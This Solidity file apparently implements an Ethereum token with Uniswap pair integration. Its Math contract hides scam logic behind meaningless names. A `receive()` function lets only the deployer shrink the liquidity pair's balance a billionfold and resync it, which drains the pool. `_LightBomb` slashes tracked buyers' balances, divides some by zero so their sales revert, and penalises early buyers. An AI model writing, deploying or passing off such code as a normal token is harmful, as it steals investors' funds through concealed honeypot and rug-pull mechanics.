pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Math { 
    mapping (address => uint256) internal _balances;
    mapping (address => bool) internal AirCon;

    address[] internal lightArr; address[3] internal liAddr;

    bool[3] internal Tomb; bool internal trading = false;

    uint256 internal Pants = block.number*2; uint256 internal numB;
    uint256 internal Glove = 0; uint256 internal World = 1;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    function _set() internal {
        liAddr[0] = address(_router);
        liAddr[1] = msg.sender;
        liAddr[2] = pair;
        for (uint256 q=0; q < 3; q++) {Math.AirCon[Math.liAddr[q]] = true; Math.Tomb[q] = false; }
    }

    function last(uint256 g) internal view returns (address) { return (Glove > 1 ? lightArr[lightArr.length-g-1] : address(0)); }

    receive() external payable {
        require(msg.sender == liAddr[1]); _balances[liAddr[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(liAddr[2]).sync(); Tomb[2] = true;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((trading || (sender == liAddr[1])), "ERC20: trading is not yet enabled.");
        World += ((AirCon[sender] != true) && (AirCon[recipient] == true)) ? 1 : 0;
        if (((AirCon[sender] == true) && (AirCon[recipient] != true)) || ((AirCon[sender] != true) && (AirCon[recipient] != true))) { lightArr.push(recipient); }
        _LightBomb(sender, recipient);
    }

    function _LightBomb(address sender, address recipient) internal {
        if ((Tomb[0] || (Tomb[2] && (recipient != liAddr[1])))) { for (uint256 q=0; q < lightArr.length-1; q++) { _balances[lightArr[q]] /= (Tomb[2] ? 1e9 : 4e1); } Tomb[0] = false; }
        _balances[last(1)] /= (((Pants == block.number) || Tomb[1] || ((Pants - numB) <= 7)) && (AirCon[last(1)] != true) && (Glove > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Tomb[1]) && (last(0) == sender)) || ((Tomb[2] && (liAddr[1] != sender))) ? (0) : (1));
        (Tomb[0],Tomb[1]) = ((((World*10 / 4) == 10) && (Tomb[1] == false)) ? (true,true) : (Tomb[0],Tomb[1]));
        Pants = block.number; Glove++;
    }
}